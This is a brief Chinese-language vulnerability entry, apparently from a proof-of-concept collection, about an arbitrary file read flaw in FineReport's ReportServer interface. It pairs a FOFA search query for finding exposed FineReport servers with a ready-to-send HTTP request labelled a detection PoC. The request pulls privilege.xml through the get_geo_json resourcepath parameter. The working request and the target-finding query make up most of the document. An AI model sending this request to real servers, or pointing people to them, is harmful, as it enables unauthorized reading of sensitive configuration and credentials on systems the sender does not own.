**fofa**

```
app="帆软-FineReport"
```

**一、漏洞简述**

FineReport是由帆软自主研发的一款纯Java编写的报表软件产品，集数据展示（报表）和数据录入(表单)功能于一身，能够制作复杂的报表，操作简单易用。针对软件开发商和系统集成商，用于快速构建企业信息系统的中国式Web报表软件。其接口ReportServer存在任意文件读取漏洞，攻击者可通过该漏洞获取系统敏感文件。

**二、漏洞检测poc**

```yaml
GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close


```

